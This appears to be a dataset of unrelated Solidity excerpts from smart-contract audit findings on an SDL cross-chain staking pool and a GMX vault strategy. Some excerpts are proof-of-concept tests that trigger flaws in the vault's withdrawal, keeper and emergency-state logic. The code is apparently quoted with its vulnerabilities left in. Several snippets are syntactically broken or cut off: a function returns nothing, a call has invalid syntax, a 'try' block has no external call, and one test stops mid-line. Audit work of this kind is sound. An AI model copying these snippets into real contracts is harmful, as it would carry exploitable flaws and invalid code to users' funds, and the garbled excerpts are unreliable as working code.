"```\nfunction _queueLockUpdate(\n    address _owner,\n    uint256 _lockId,\n    uint256 _amount,\n    uint64 _lockingDuration\n) internal onlyLockOwner(_lockId, _owner) {\n    Lock memory lock = _getQueuedLockState(_lockId);\n    LockUpdate memory lockUpdate = LockUpdate(updateBatchIndex, _updateLock(lock, _amount, _lockingDuration));\n    queuedLockUpdates[_lockId].push(lockUpdate);\n    queuedRESDLSupplyChange +=\n        int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) -\n        int256(lock.amount + lock.boostAmount);\n}\n```\n```\nfunction _updateLock(\n    Lock memory _lock,\n    uint256 _amount,\n    uint64 _lockingDuration\n) internal view returns (Lock memory) {\n    if ((_lock.expiry == 0 || _lock.expiry > block.timestamp) && _lockingDuration < _lock.duration) {\n        revert InvalidLockingDuration();\n    }\n\n    Lock memory lock = Lock(\n        _lock.amount,\n        _lock.boostAmount,\n        _lock.startTime,\n        _lock.duration,\n        _lock.expiry\n    );\n\n    uint256 baseAmount = _lock.amount + _amount;\n    uint256 boostAmount = boostController.getBoostAmount(baseAmount, _lockingDuration);\n\n    lock.boostAmount = boostAmount;\n}\n```\n```\nuint256 numUpdates = queuedLockUpdates[lockId].length;\n\nLock memory curLockState = locks[lockId];\nuint256 j = 0;\nwhile (j < numUpdates) {\n    if (queuedLockUpdates[lockId][j].updateBatchIndex > finalizedBatchIndex) {\n        break;\n    }\n\n    Lock memory updateLockState = queuedLockUpdates[lockId][j].lock;\n    int256 baseAmountDiff = int256(updateLockState.amount) - int256(curLockState.amount);\n    int256 boostAmountDiff = int256(updateLockState.boostAmount) - int256(curLockState.boostAmount);\n\n    if (baseAmountDiff < 0) {\n        // rest of code\n    } else if (boostAmountDiff < 0) {\n        locks[lockId].expiry = updateLockState.expiry;\n        locks[lockId].boostAmount = 0;\n        emit InitiateUnlock(_owner, lockId, updateLockState.expiry);\n    } else {\n        // rest of code\n    }\n}\n// rest of code\n```\n```\nqueuedRESDLSupplyChange += \n    int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) - \n    int256(lock.amount + lock.boostAmount);\n```"
"```\nfunction _ccipReceive(Client.Any2EVMMessage memory _message) internal override {\n    uint64 sourceChainSelector = _message.sourceChainSelector;\n\n    (uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange) = abi.decode(_message.data, (uint256, int256));\n\n    if (totalRESDLSupplyChange > 0) {\n        reSDLSupplyByChain[sourceChainSelector] += uint256(totalRESDLSupplyChange);\n    } else if (totalRESDLSupplyChange < 0) {\n        reSDLSupplyByChain[sourceChainSelector] -= uint256(-1 * totalRESDLSupplyChange);\n    }\n\n    uint256 mintStartIndex = ISDLPoolPrimary(sdlPool).handleIncomingUpdate(numNewRESDLTokens, totalRESDLSupplyChange);\n\n    _ccipSendUpdate(sourceChainSelector, mintStartIndex);\n\n    emit MessageReceived(_message.messageId, sourceChainSelector);\n}\n```\nfunction _ccipReceive(Client.Any2EVMMessage memory _message) internal override {\n    if (_message.data.length == 0) {\n        uint256 numRewardTokens = _message.destTokenAmounts.length;\n        address[] memory rewardTokens = new address[](numRewardTokens);\n        if (numRewardTokens!= 0) {\n            for (uint256 i = 0; i < numRewardTokens; i++) {\n                rewardTokens[i] = _message.destTokenAmounts[i].token;\n                IERC20(rewardTokens[i]).safeTransfer(sdlPool, _message.destTokenAmounts[i].amount);\n            }\n            ISDLPoolSecondary(sdlPool).distributeTokens(rewardTokens);\n            if (ISDLPoolSecondary(sdlPool).shouldUpdate()) {\n                shouldUpdate = true;\n            }\n        }\n    } else {\n        uint256 mintStartIndex = abi.decode(_message.data, (uint256));\n        ISDLPoolSecondary(sdlPool).handleIncomingUpdate(mintStartIndex);\n    }\n\n    emit MessageReceived(_message.messageId, _message.sourceChainSelector);\n}\n```\n```\nfunction performUpkeep(bytes calldata) external {\n    if (!shouldUpdate) {\n        revert UpdateConditionsNotMet();\n    }\n\n    shouldUpdate = false;\n    _initiateUpdate(primaryChainSelector, primaryChainDestination, extraArgs);\n}\n```\n```\nit('codehawks performUpkeep reverts', async () => {\n  await token1.transfer(tokenPool.address, toEther(1000));\n  let rewardsPool1 = await deploy('RewardsPool', [sdlPool.address, token1.address]);\n  await sdlPool.addToken(token1.address, rewardsPool1.address);\n  assert.equal(fromEther(await sdlPool.totalEffectiveBalance()), 400);\n  assert.equal((await controller.checkUpkeep('0x'))[0], false);\n  assert.equal(await controller.shouldUpdate(), false);\n\n  // 1. Mint in the secondary pool\n  await sdlToken.transferAndCall(\n    sdlPool.address,\n    toEther(100),\n    ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])\n  );\n\n  // 2. The secondary pool needs to update data to the primary chain but the `controller.shouldUpdate` is false so `performUpkeep` reverts the transaction\n  assert.equal(await sdlPool.shouldUpdate(), true);\n  assert.equal((await controller.checkUpkeep('0x'))[0], false);\n  assert.equal(await controller.shouldUpdate(), false);\n  await expect(controller.performUpkeep('0x')).to.be.revertedWith('UpdateConditionsNotMet()');\n})"
"```\nfunction processDeposit(GMXTypes.Store storage self) external {\n    self.depositCache.healthParams.equityAfter = GMXReader.equityValue(self);\n    self.depositCache.sharesToUser = GMXReader.valueToShares(\n        self,\n        self.depositCache.healthParams.equityAfter - self.depositCache.healthParams.equityBefore,\n        self.depositCache.healthParams.equityBefore\n    );\n\n    GMXChecks.afterDepositChecks(self);\n}\n\nfunction valueToShares(GMXTypes.Store storage self, uint256 value, uint256 currentEquity)\n    public\n    view\n    returns (uint256)\n{\n    uint256 _sharesSupply = IERC20(address(self.vault)).totalSupply() + pendingFee(self); // shares is added\n    if (_sharesSupply == 0 || currentEquity == 0) return value;\n    return value * _sharesSupply / currentEquity;\n}\n```"
"```\nfunction compound(GMXTypes.Store storage self, GMXTypes.CompoundParams memory cp) external {\n    if (self.tokenA.balanceOf(address(self.trove)) > 0) {\n        self.tokenA.safeTransferFrom(address(self.trove), address(this), self.tokenA.balanceOf(address(self.trove)));\n    }\n    if (self.tokenB.balanceOf(address(self.trove)) > 0) {\n        self.tokenB.safeTransferFrom(address(self.trove), address(this), self.tokenB.balanceOf(address(self.trove)));\n    }\n\n    uint256 _tokenInAmt = IERC20(cp.tokenIn).balanceOf(address(this));\n\n    if (_tokenInAmt > 0) {\n        self.refundee = payable(msg.sender);\n\n        self.compoundCache.compoundParams = cp;\n\n        ISwap.SwapParams memory _sp;\n\n        _sp.tokenIn = cp.tokenIn;\n        _sp.tokenOut = cp.tokenOut;\n        _sp.amountIn = _tokenInAmt;\n        _sp.amountOut = 0;\n        _sp.slippage = self.minSlippage;\n        _sp.deadline = cp.deadline;\n\n        GMXManager.swapExactTokensForTokens(self, _sp);\n\n        GMXTypes.AddLiquidityParams memory _alp;\n\n        _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n        _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n        self.compoundCache.depositValue = GMXReader.convertToUsdValue(self, address(self.tokenA), self.tokenA.balanceOf(address(this))) + GMXReader.convertToUsdValue(self, address(self.tokenB), self.tokenB.balanceOf(address(this)));\n        GMXChecks.beforeCompoundChecks(self);\n\n        self.status = GMXTypes.Status.Compound;\n\n        _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(self, self.compoundCache.depositValue, cp.slippage);\n\n        _alp.executionFee = cp.executionFee;\n        self.compoundCache.depositKey = GMXManager.addLiquidity(self, _alp);\n    }\n```\n```\nfunction processCompoundCancellation(GMXTypes.Store storage self) external {\n    GMXChecks.beforeProcessCompoundCancellationChecks(self);\n    self.status = GMXTypes.Status.Compound_Failed;\n\n    emit CompoundCancelled();\n}\n```\n```\nuint256 _tokenInAmt = IERC20(cp.tokenIn).balanceOf(address(this));\n\nif (_tokenInAmt > 0) {\n    // compound logic\n    // rest of code.\n}\n```"
```\nfunction pendingFee(GMXTypes.Store storage self) public view returns (uint256) {\n    uint256 totalSupply_ = IERC20(address(self.vault)).totalSupply();\n    uint256 _secondsFromLastCollection = block.timestamp - self.lastFeeCollected;\n    return (totalSupply_ * self.feePerSecond * _secondsFromLastCollection) / SAFE_MULTIPLIER;\n}\n```
"```\nfunction afterDepositExecution(\n    bytes32 depositKey,\n    IDeposit.Props memory depositProps,\n    IEvent.Props memory eventData\n) external onlyController {\n    GMXTypes.Store memory _store = vault.store();\n\n    if (_store.status == GMXTypes.Status.Deposit &&\n        _store.depositCache.depositKey == depositKey) {\n        vault.processDeposit();\n    } else if (_store.status == GMXTypes.Status.Rebalance_Add &&\n        _store.rebalanceCache.depositKey == depositKey) {\n        vault.processRebalanceAdd();\n    } else if (_store.status == GMXTypes.Status.Compound &&\n        _store.compoundCache.depositKey == depositKey) {\n        vault.processCompound();\n    } else if (_store.status == GMXTypes.Status.Withdraw_Failed &&\n        _store.withdrawCache.depositKey == depositKey) {\n        vault.processWithdrawFailureLiquidityAdded();\n    } else if (_store.status == GMXTypes.Status.Resume) {\n        vault.processEmergencyResume();\n    }\n}\n```\n```\nfunction beforeProcessDepositChecks(\n    GMXTypes.Store storage self\n) external view {\n    if (self.status!= GMXTypes.Status.Deposit)\n        revert Errors.NotAllowedInCurrentVaultStatus();\n}\n```"
"```\npragma solidity 0.8.21;\n\nimport { console, console2 } from ""forge-std/Test.sol"";\nimport { TestUtils } from ""../../helpers/TestUtils.sol"";\nimport { IERC20 } from ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";\nimport { GMXMockVaultSetup } from ""./GMXMockVaultSetup.t.sol"";\nimport { GMXTypes } from ""../../../contracts/strategy/gmx/GMXTypes.sol"";\nimport { GMXTestHelper } from ""./GMXTestHelper.sol"";\n\nimport { IDeposit } from ""../../../contracts/interfaces/protocols/gmx/IDeposit.sol"";\nimport { IEvent } from ""../../../contracts/interfaces/protocols/gmx/IEvent.sol"";\n\ncontract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {\n    function test_POC1() public {\n        vm.startPrank(owner);\n        _createDeposit(address(WETH), 1 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n\n        vm.startPrank(user1);\n        _createDeposit(address(WETH), 1 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n\n        uint256 leverageBefore = vault.leverage();\n        (, uint256 debtAmtTokenBBefore) = vault.debtAmt();\n\n        uint256 vaultSharesAmount = IERC20(address(vault)).balanceOf(user1);  //Vault shares to withdraw\n        GMXTypes.Store memory _store;\n        for (uint256 i = 0; i < 5; i++) {\n            vm.startPrank(user1);\n            _createAndExecuteWithdrawal(address(WETH), address(USDC), address(USDC), vaultSharesAmount, 10000 ether, SLIPPAGE, EXECUTION_FEE);\n\n            _store = vault.store();\n            assert(uint256(_store.status) == uint256(GMXTypes.Status.Withdraw_Failed));  //Since the afterWithdrawChecks have failed, the Vault status is Withdraw_Failed\n\n            vault.processWithdrawFailure{value: EXECUTION_FEE}(SLIPPAGE, EXECUTION_FEE);\n            mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n            vm.stop"
"```\nif using contracts such as the ExchangeRouter, Oracle or Reader:\n    do note that their addresses will change as new logic is added\n```"
"```\nfunction depositNative(GMXTypes.DepositParams memory dp) external payable nonReentrant {\n    GMXDeposit.deposit(_store, dp, true);\n}\n```\n```\n_dc.user = payable(msg.sender)\n```\n```\n(bool success,) = self.depositCache.user.call(\n    value: address(this).balance\n    """"\n);\nrequire(success, ""Transfer failed."");\n```"
"```\nFile: GMXVaul.sol\n\nfunction emergencyClose(uint256 deadline) external onlyOwner {\n    GMXEmergency.emergencyClose(_store, deadline);\n}\n```\n```\nfunction emergencyPause(\n    GMXTypes.Store storage self\n) external {\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // Remove all of the vault's LP tokens\n    _rlp.lpAmt = self.lpToken.balanceOf(address(this));\n    _rlp.executionFee = msg.value;\n\n    GMXManager.removeLiquidity(\n        self,\n        _rlp\n    );\n\n    self.status = GMXTypes.Status.Paused;\n\n    emit EmergencyPause();\n}\n```\n```\nfunction emergencyResume(\n    GMXTypes.Store storage self\n) external {\n    GMXChecks.beforeEmergencyResumeChecks(self);\n\n    self.status = GMXTypes.Status.Resume;\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n    _alp.executionFee = msg.value;\n\n    GMXManager.addLiquidity(\n        self,\n        _alp\n    );\n}\n```\n```\nfunction test_close_then_pause() external {\n    vault.emergencyPause();\n    console2.log(""vault status"", uint256(vault.store().status));\n\n    vault.emergencyClose(deadline);\n    console2.log(""vault status"", uint256(vault.store().status));\n\n    vault.emergencyPause();\n    console2.log(""vault status"", uint256(vault.store().status));\n    assertEq(uint256(vault.store().status), 10, ""vault status not set to paused"");\n\n    vault.emergencyResume();\n    console2.log(""vault status"", uint256(vault.store().status));\n}"
"```\nfunction processDepositCancellation(\n    GMXTypes.Store storage self\n) external {\n    GMXChecks.beforeProcessDepositCancellationChecks(self);\n\n    // Transfer requested withdraw asset to user\n    IERC20(self.depositCache.depositParams.token).safeTransfer(\n        self.depositCache.user,\n        self.depositCache.depositParams.amt\n    );\n\n    self.status = GMXTypes.Status.Open;\n\n    emit DepositCancelled(self.depositCache.user);\n}\n```\n```\nfunction processDepositFailureLiquidityWithdrawal(\n    GMXTypes.Store storage self\n) public {\n    GMXChecks.beforeProcessAfterDepositFailureLiquidityWithdrawal(self);\n\n    // Refund user the rest of the remaining withdrawn LP assets\n    // Will be in tokenA/tokenB only; so if user deposited LP tokens\n    // they will still be refunded in tokenA/tokenB\n    self.tokenA.safeTransfer(self.depositCache.user, self.tokenA.balanceOf(address(this)));\n    self.tokenB.safeTransfer(self.depositCache.user, self.tokenB.balanceOf(address(this)));\n\n    self.status = GMXTypes.Status.Open;\n}\n```\n```\nfunction processWithdraw(\n    GMXTypes.Store storage self\n) external {\n    GMXChecks.beforeProcessWithdrawChecks(self);\n\n    try {\n        GMXProcessWithdraw.processWithdraw(self);\n        if (self.withdrawCache.withdrawParams.token == address(self.WNT)) {\n            // rest of code\n        } else {\n            // Transfer requested withdraw asset to user\n            IERC20(self.withdrawCache.withdrawParams.token).safeTransfer(\n                self.withdrawCache.user,\n                self.withdrawCache.tokensToUser\n            );\n        }\n\n        // Transfer any remaining tokenA/B that was unused (due to slippage) to user as well\n        self.tokenA.safeTransfer(self.withdrawCache.user, self.tokenA.balanceOf(address(this)));\n        self.tokenB.safeTransfer(self.withdrawCache.user, self.tokenB.balanceOf(address(this)));\n    } catch {\n        // rest of code\n\n        self.status = GMXTypes.Status.Open;\n    }\n}\n```"
"```\nfunction beforeRebalanceChecks(\n  GMXTypes.Store storage self,\n  GMXTypes.RebalanceType rebalanceType\n) external view {\n  if (\n    self.status!= GMXTypes.Status.Open &&\n    self.status!= GMXTypes.Status.Rebalance_Open\n  ) {\n    revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  if (rebalanceType == GMXTypes.RebalanceType.Delta && self.delta == GMXTypes.Delta.Neutral) {\n    if (\n      self.rebalanceCache.healthParams.deltaBefore <\n      self.deltaUpperLimit &&\n      self.rebalanceCache.healthParams.deltaBefore >\n      self.deltaLowerLimit\n    ) {\n      revert Errors.InvalidRebalancePreConditions();\n    }\n  } else if (rebalanceType == GMXTypes.RebalanceType.Debt) {\n    if (\n      self.rebalanceCache.healthParams.debtRatioBefore <\n      self.debtRatioUpperLimit &&\n      self.rebalanceCache.healthParams.debtRatioBefore >\n      self.debtRatioLowerLimit\n    ) {\n      revert Errors.InvalidRebalancePreConditions();\n    }\n  } else {\n    revert Errors.InvalidRebalanceParameters();\n  }\n}\n```\n```\nfunction afterRebalanceChecks(\n  GMXTypes.Store storage self\n) external view {\n  // Guards: check that delta is within limits for Neutral strategy\n  if (self.delta == GMXTypes.Delta.Neutral) {\n    int256 _delta = GMXReader.delta(self);\n    if (_delta > self.deltaUpperLimit || _delta < self.deltaLowerLimit) {\n      revert Errors.InvalidDelta();\n    }\n  }\n\n  // Guards: check that debt is within limits for Long/Neutral strategy\n  uint256 _debtRatio = GMXReader.debtRatio(self);\n  if (_debtRatio > self.debtRatioUpperLimit || _debtRatio < self.debtRatioLowerLimit) {\n    revert Errors.InvalidDebtRatio();\n  }\n}\n```"
```\nFile: contracts/strategy/gmx/GMXChecks.sol\n\nif (self.depositCache.depositParams.amt == 0)\n    revert Errors.InsufficientDepositAmount();\n\nif (depositValue == 0)\n    revert Errors.InsufficientDepositAmount();\n\nif (self.compoundCache.depositValue == 0)\n    revert Errors.InsufficientDepositAmount();
"```\nself.tokenA.safeTransfer(self.withdrawCache.user, self.tokenA.balanceOf(address(this)))\n```"
"```\nfunction emergencyClose(GMXTypes.Store storage self, uint256 deadline) external {\n    GMXChecks.beforeEmergencyCloseChecks(self);\n\n    GMXTypes.RepayParams memory _rp;\n    (_rp.repayTokenAAmt, _rp.repayTokenBAmt) = GMXManager.calcRepay(self, 1e18);\n\n    (bool _swapNeeded, address _tokenFrom, address _tokenTo, uint256 _tokenToAmt) =\n        GMXManager.calcSwapForRepay(self, _rp);\n\n    if (_swapNeeded) {\n        ISwap.SwapParams memory _sp;\n        _sp.tokenIn = _tokenFrom;\n        _sp.tokenOut = _tokenTo;\n        _sp.amountIn = IERC20(_tokenFrom).balanceOf(address(this));\n        _sp.amountOut = _tokenToAmt;\n        _sp.slippage = self.minSlippage;\n        _sp.deadline = deadline;\n\n        GMXManager.swapTokensForExactTokens(self, _sp);\n    }\n    GMXManager.repay(self, _rp.repayTokenAAmt, _rp.repayTokenBAmt);\n\n    self.status = GMXTypes.Status.Closed;\n\n    emit EmergencyClose(_rp.repayTokenAAmt, _rp.repayTokenBAmt);\n}\n```\n```\nfunction calcSwapForRepay(GMXTypes.Store storage self, GMXTypes.RepayParams memory rp)\n    external\n    view\n    returns (bool, address, address, uint256)\n{\n    address _tokenFrom;\n    address _tokenTo;\n    uint256 _tokenToAmt;\n\n    if (rp.repayTokenAAmt > self.tokenA.balanceOf(address(this))) {\n        _tokenToAmt = rp.repayTokenAAmt - self.tokenA.balanceOf(address(this));\n        _tokenFrom = address(self.tokenB);\n        _tokenTo = address(self.tokenA);\n\n        return (true, _tokenFrom, _tokenTo, _tokenToAmt);\n    } else if (rp.repayTokenBAmt > self.tokenB.balanceOf(address(this))) {\n        _tokenToAmt = rp.repayTokenBAmt - self.tokenB.balanceOf(address(this));\n        _tokenFrom = address(self.tokenA);\n        _tokenTo = address(self.tokenB);\n\n        return (true, _tokenFrom, _tokenTo, _tokenToAmt);\n    } else {\n        return (false, address(0), address(0), 0);\n    }\n}\n```"
"```\nfunction emergencyPause(\n    GMXTypes.Store storage self\n) external {\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // Remove all of the vault's LP tokens\n    _rlp.lpAmt = self.lpToken.balanceOf(address(this));\n    _rlp.executionFee = msg.value;\n\n    GMXManager.removeLiquidity(\n        self,\n        _rlp\n    );\n\n    self.status = GMXTypes.Status.Paused;\n\n    emit EmergencyPause();\n}\n```\n```\nstruct RemoveLiquidityParams {\n    uint256 lpAmt;\n    address[] tokenASwapPath;\n    address[] tokenBSwapPath;\n    uint256 minTokenAAmt;\n    uint256 minTokenBAmt;\n    uint256 executionFee;\n}\n```\n```\nfunction emergencyResume(\n    GMXTypes.Store storage self\n) external {\n    GMXChecks.beforeEmergencyResumeChecks(self);\n\n    self.status = GMXTypes.Status.Resume;\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n    _alp.executionFee = msg.value;\n\n    GMXManager.addLiquidity(\n        self,\n        _alp\n    );\n}\n```"
"```\npragma solidity 0.8.21;\n\nimport { SafeCast } from ""@openzeppelin/contracts/utils/math/SafeCast.sol"";\n\nerror BrokenTokenPriceFeed();\n\ncontract PassWithNegativePrice {\n    using SafeCast for int256;\n\n    uint256 public maxDeviations;\n    int256 public currentResponse;\n    int256 public prevResponse;\n    uint8 public decimal;\n\n    constructor(\n        int256 _currentResponse,\n        int256 _prevResponse,\n        uint8 _decimal,\n        uint256 _maxDeviations\n    ) {\n        currentResponse = _currentResponse;\n        prevResponse = _prevResponse;\n        decimal = _decimal;\n        maxDeviations = _maxDeviations;\n    }\n\n    function consultIn18Decimals() external view returns (uint256) {\n        (int256 _answer, uint8 _decimals) = consult();\n\n        return _answer.toUint256() * 1e18 / (10 ** _decimals);\n    }\n\n    function consult() internal view returns (int256, uint8) {\n        if (_badPriceDeviation(currentResponse, prevResponse)) {\n            revert BrokenTokenPriceFeed();\n        }\n\n        return (currentResponse, decimal);\n    }\n\n    function _badPriceDeviation(int256 _currentResponse, int256 _prevResponse) internal view returns (bool) {\n        uint256 _deviation;\n\n        if (_currentResponse > _prevResponse) {\n            _deviation = uint256(_currentResponse - _prevResponse) * 1e18 / uint256(_prevResponse);\n        } else {\n            _deviation = uint256(_prevResponse - _currentResponse) * 1e18 / uint256(_prevResponse);\n        }\n\n        return _deviation > maxDeviations;\n    }\n}"
"```\nif (self.withdrawCache.withdrawParams.token == address(self.WNT)) {\n    self.WNT.withdraw(self.withdrawCache.tokensToUser);\n    (bool success,) = self.withdrawCache.user.call{value: address(this).balance}("""");\n    require(success, ""Transfer failed."");\n} else {\n    // Transfer requested withdraw asset to user\n    IERC20(self.withdrawCache.withdrawParams.token).safeTransfer(\n        self.withdrawCache.user,\n        self.withdrawCache.tokensToUser\n    );\n}\n\n// Transfer any remaining tokenA/B that was unused (due to slippage) to user as well\nself.tokenA.safeTransfer(self.withdrawCache.user, self.tokenA.balanceOf(address(this)));\nself.tokenB.safeTransfer(self.withdrawCache.user, self.tokenB.balanceOf(address(this)));\n\n// Burn user shares\nself.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);\n```"
"```\nfunction getMarketTokenPrice(\n    DataStore dataStore,\n    Market.Props memory market,\n    Price.Props memory indexTokenPrice,\n    Price.Props memory longTokenPrice,\n    Price.Props memory shortTokenPrice,\n    bytes32 pnlFactorType,\n    bool maximize\n) external view returns (int256, MarketPoolValueInfo.Props memory) {\n    return MarketUtils.getMarketTokenPrice(\n        dataStore,\n        market,\n        indexTokenPrice,\n        longTokenPrice,\n        shortTokenPrice,\n        pnlFactorType,\n        maximize\n    );\n}\n```"
"```\nfunction addTokenPriceFeed(address token, address feed) external onlyOwner {\n    if (token == address(0)) {\n        revert Errors.ZeroAddressNotAllowed();\n    }\n    if (feed == address(0)) {\n        revert Errors.ZeroAddressNotAllowed();\n    }\n    if (feeds[token]!= address(0)) {\n        revert Errors.TokenPriceFeedAlreadySet();\n    }\n    feeds[token] = feed;\n}\n```"
"```\n(uint80 _latestRoundId,\n    int256 _latestAnswer,\n    uint256 _latestTimestamp\n) = AggregatorV3Interface(_feed).latestRoundData();\n```"
"```\nif (_tokenInAmt > 0) {\n    self.refundee = payable(msg.sender);\n\n    self.compoundCache.compoundParams = cp;\n\n    ISwap.SwapParams memory _sp;\n\n    _sp.tokenIn = cp.tokenIn;\n    _sp.tokenOut = cp.tokenOut;\n    _sp.amountIn = _tokenInAmt;\n    _sp.amountOut = 0; // amount out minimum calculated in Swap\n    _sp.slippage = self.minSlippage;\n    _sp.deadline = cp.deadline;\n\n    GMXManager.swapExactTokensForTokens(self, _sp);\n\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n\n    self.compoundCache.depositValue = GMXReader.convertToUsdValue(\n        self,\n        address(self.tokenA),\n        self.tokenA.balanceOf(address(this))\n    )\n    + GMXReader.convertToUsdValue(\n        self,\n        address(self.tokenB),\n        self.tokenB.balanceOf(address(this))\n    );\n\n    GMXChecks.beforeCompoundChecks(self);\n\n    self.status = GMXTypes.Status.Compound;\n\n    _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(\n        self,\n        self.compoundCache.depositValue,\n        cp.slippage\n    );\n\n    _alp.executionFee = cp.executionFee;\n\n    self.compoundCache.depositKey = GMXManager.addLiquidity(\n        self,\n        _alp\n    );\n}\n```"
"```\nfunction consult(address token) public view whenNotPaused returns (int256, uint8) {\n    address _feed = feeds[token];\n\n    if (_feed == address(0)) {\n        revert Errors.NoTokenPriceFeedAvailable();\n    }\n\n    ChainlinkResponse memory chainlinkResponse = _getChainlinkResponse(_feed);\n    ChainlinkResponse memory prevChainlinkResponse = _getPrevChainlinkResponse(_feed, chainlinkResponse.roundId);\n    if (_chainlinkIsFrozen(chainlinkResponse, token)) {\n        revert Errors.FrozenTokenPriceFeed();\n    }\n    if (_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse, token)) {\n        revert Errors.BrokenTokenPriceFeed();\n    }\n\n    return (chainlinkResponse.answer, chainlinkResponse.decimals);\n}\n```\nfunction _getPrevChainlinkResponse(address _feed, uint80 _currentRoundId) internal view returns (ChainlinkResponse memory) {\n    ChainlinkResponse memory _prevChainlinkResponse;\n\n    (\n        uint80 _roundId,\n        int256 _answer,\n        uint256 _startedAt,\n        uint256 _timestamp,\n        uint80 _answeredInRound\n    ) = AggregatorV3Interface(_feed).getRoundData(_currentRoundId - 1);\n\n    _prevChainlinkResponse.roundId = _roundId;\n    _prevChainlinkResponse.answer = _answer;\n    _prevChainlinkResponse.timestamp = _timestamp;\n    _prevChainlinkResponse.success = true;\n\n    return _prevChainlinkResponse;\n}"
"```\nfunction deposit(GMXTypes.DepositParams memory dp) external payable nonReentrant {\n    GMXDeposit.deposit(_store, dp, false);\n}\n\nstruct DepositParams {\n    address token;\n    uint256 amt;\n    uint256 minSharesAmt;\n    uint256 slippage;\n    uint256 executionFee;\n}\n```\n```\nfunction deposit(GMXTypes.Store storage self, GMXTypes.DepositParams memory dp, bool isNative) external {\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n        self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n        self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n\n    self.refundee = payable(msg.sender);\n\n    _dc.depositKey = GMXManager.addLiquidity(self, _alp);\n\n    self.depositCache = _dc;\n\n    emit DepositCreated(_dc.user, _dc.depositParams.token, _dc.depositParams.amt);\n}\n```\n```\nfunction processDepositFailure(uint256 slippage, uint256 executionFee) external payable onlyKeeper {\n    GMXDeposit.processDepositFailure(_store, slippage, executionFee);\n}\n```\n```\nfunction processDepositFailure(GMXTypes.Store storage self, uint256 slippage, uint256 executionFee) external {\n    GMXChecks.beforeProcessAfterDepositFailureChecks(self);\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    if (GMXReader.lpAmt(self) <= self.depositCache.healthParams.lpAmtBefore) {\n        processDepositFailureLiquidityWithdrawal(self);\n    } else {\n        _rlp.lpAmt = GMXReader.lpAmt(self) - self.depositCache.healthParams.lpAmtBefore;\n\n        if (self.delta == GMXTypes.Delta.Long) {\n            address[] memory _tokenASwapPath = new address[](1);\n            _tokenASwapPath[0] = address(self.lpToken);\n            _rlp.tokenASwapPath = _tokenASwapPath;\n\n            (uint256 _minTokenAAmt, uint256 _minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n                self, _rlp.lpAmt, address(self.tokenB), address(self.tokenB), slippage\n            );\n        } else {\n            (uint256 _minTokenAAmt, uint256 _minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n                self, _rlp.lpAmt, address(self.tokenA), address(self.tokenB), slippage\n            );\n        }\n\n        _rlp.executionFee = executionFee;\n\n        _rlp.minTokenAAmt = _minTokenAAmt;\n        _rlp.minTokenBAmt = _minTokenBAmt;\n\n        self.depositCache.withdrawKey = GMXManager.removeLiquidity(self, _rlp);\n    }\n}"
"```\nfunction mintFee() public {\n    _mint(_store.treasury, GMXReader.pendingFee(_store));\n    _store.lastFeeCollected = block.timestamp;\n}\n```\n```\n67    _wc.shareRatio = wp.shareAmt * SAFE_MULTIPLIER / IERC20(address(self.vault)).totalSupply()\n68    _wc.lpAmt = _wc.shareRatio * GMXReader.lpAmt(self) / SAFE_MULTIPLIER\n\n101    self.vault.mintFee()\n```"
```\nfunction updateFeePerSecond(uint256 feePerSecond) external onlyOwner {\n    _store.feePerSecond = feePerSecond;\n    emit FeePerSecondUpdated(feePerSecond);\n}\n```
